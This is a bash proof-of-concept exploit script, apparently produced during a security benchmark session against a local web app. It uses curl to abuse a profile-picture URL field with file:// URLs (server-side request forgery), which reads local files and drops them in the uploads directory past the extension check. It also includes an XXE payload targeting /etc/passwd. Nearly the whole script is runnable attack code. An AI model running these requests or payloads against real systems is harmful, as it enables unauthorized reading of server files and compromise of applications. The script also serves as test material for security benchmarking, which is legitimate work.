#!/bin/bash
# POC: Demonstrates file extension validation bypass where SSRF downloads avoid file extension checks that direct uploads enforce
# Target: ./repo
# Created: 2025-11-04T17:30:18.899Z
# Session: benchmark-XBEN-024-24-mhktkgzl

# File Extension Validation Bypass via SSRF POC
# Demonstrates that direct uploads enforce file extension validation
# but SSRF downloads bypass this validation, allowing arbitrary file types

set -e

TARGET_URL="${1:-http://localhost}"
SESSION_COOKIE="${2:-}"

# Color output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m' # No Color

echo -e "${YELLOW}[*] File Extension Validation Bypass via SSRF POC${NC}"
echo -e "${YELLOW}[*] Target: $TARGET_URL${NC}"

# Test 1: Attempt direct upload of .txt file (should be rejected)
echo -e "\n${YELLOW}[TEST 1] Direct upload of .txt file (should be REJECTED)${NC}"
TEMP_TXT=$(mktemp /tmp/test_XXXXXX.txt)
echo "This is a test file that should not be allowed" > "$TEMP_TXT"

RESPONSE=$(curl -s -w "\n%{http_code}" \
  -F "profile_picture=@$TEMP_TXT" \
  "$TARGET_URL/profile" 2>&1)

HTTP_CODE=$(echo "$RESPONSE" | tail -n1)
RESPONSE_BODY=$(echo "$RESPONSE" | head -n-1)

echo "HTTP Code: $HTTP_CODE"

# Check if file was created (it shouldn't be)
UPLOADS_DIR="/home/daytona/repo/app/static/uploads"
TEST_FILENAME=$(basename "$TEMP_TXT" .txt)
TXT_FILE="$UPLOADS_DIR/test_*"

if ls $TXT_FILE 2>/dev/null | grep -q "test_"; then
    echo -e "${RED}[!] ERROR: Direct .txt upload was NOT rejected!${NC}"
else
    echo -e "${GREEN}[+] PASS: Direct .txt upload was correctly rejected${NC}"
fi

rm -f "$TEMP_TXT"

# Test 2: Upload .txt file via SSRF using file:// URL (should bypass validation)
echo -e "\n${YELLOW}[TEST 2] SSRF upload of .txt file via file:// URL${NC}"

# Create a test .txt file to download via SSRF
SSRF_SOURCE=$(mktemp /tmp/ssrf_source_XXXXXX.txt)
echo "SSRF Downloaded Content" > "$SSRF_SOURCE"
SSRF_FILENAME=$(basename "$SSRF_SOURCE")

# Use SSRF to download the file
if [ -n "$SESSION_COOKIE" ]; then
    SSRF_RESPONSE=$(curl -s -b "session=$SESSION_COOKIE" \
      -d "profile_picture_url=file://$SSRF_SOURCE" \
      -X POST "$TARGET_URL/profile" 2>&1)
else
    SSRF_RESPONSE=$(curl -s \
      -d "profile_picture_url=file://$SSRF_SOURCE" \
      -X POST "$TARGET_URL/profile" 2>&1)
fi

echo "Response: $SSRF_RESPONSE"

# Check if the file was created in uploads
if ls "$UPLOADS_DIR/$SSRF_FILENAME" 2>/dev/null; then
    echo -e "${GREEN}[+] VULNERABILITY CONFIRMED: SSRF bypassed extension validation!${NC}"
    echo -e "${GREEN}[+] File uploaded via SSRF: $UPLOADS_DIR/$SSRF_FILENAME${NC}"
    ls -lah "$UPLOADS_DIR/$SSRF_FILENAME"
    
    # Verify content was downloaded
    CONTENT=$(cat "$UPLOADS_DIR/$SSRF_FILENAME" 2>/dev/null || echo "")
    if [[ "$CONTENT" == *"SSRF Downloaded"* ]]; then
        echo -e "${GREEN}[+] File content confirmed: $(echo $CONTENT | head -c 40)...${NC}"
    fi
else
    echo -e "${YELLOW}[-] SSRF file not found in uploads directory${NC}"
fi

rm -f "$SSRF_SOURCE"

# Test 3: Attempt to upload .xml file directly (should be rejected)
echo -e "\n${YELLOW}[TEST 3] Direct upload of .xml file (should be REJECTED)${NC}"
TEMP_XML=$(mktemp /tmp/test_XXXXXX.xml)
cat > "$TEMP_XML" << 'EOF'
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root>&xxe;</root>
EOF

RESPONSE=$(curl -s -w "\n%{http_code}" \
  -F "profile_picture=@$TEMP_XML" \
  "$TARGET_URL/profile" 2>&1)

HTTP_CODE=$(echo "$RESPONSE" | tail -n1)

echo "HTTP Code: $HTTP_CODE"

XML_FILE="$UPLOADS_DIR/test_*.xml"
if ls $XML_FILE 2>/dev/null | grep -q "test_"; then
    echo -e "${RED}[!] ERROR: Direct .xml upload was NOT rejected!${NC}"
else
    echo -e "${GREEN}[+] PASS: Direct .xml upload was correctly rejected${NC}"
fi

rm -f "$TEMP_XML"

# Test 4: Upload file without extension via SSRF (bypass validation)
echo -e "\n${YELLOW}[TEST 4] SSRF upload of file without extension${NC}"

SSRF_NOEXT=$(mktemp /tmp/ssrf_XXXXXX)
echo "File with no extension" > "$SSRF_NOEXT"
SSRF_NOEXT_FILENAME=$(basename "$SSRF_NOEXT")

if [ -n "$SESSION_COOKIE" ]; then
    curl -s -b "session=$SESSION_COOKIE" \
      -d "profile_picture_url=file://$SSRF_NOEXT" \
      -X POST "$TARGET_URL/profile" > /dev/null 2>&1
else
    curl -s \
      -d "profile_picture_url=file://$SSRF_NOEXT" \
      -X POST "$TARGET_URL/profile" > /dev/null 2>&1
fi

# Check if file was created
if ls "$UPLOADS_DIR/$SSRF_NOEXT_FILENAME" 2>/dev/null; then
    echo -e "${GREEN}[+] VULNERABILITY CONFIRMED: File without extension uploaded via SSRF!${NC}"
    echo -e "${GREEN}[+] Uploaded file: $UPLOADS_DIR/$SSRF_NOEXT_FILENAME${NC}"
else
    echo -e "${YELLOW}[-] File without extension was not uploaded${NC}"
fi

rm -f "$SSRF_NOEXT"

echo -e "\n${YELLOW}[*] POC Complete${NC}"
echo -e "${GREEN}[SUMMARY] File extension validation is bypassed for SSRF downloads${NC}"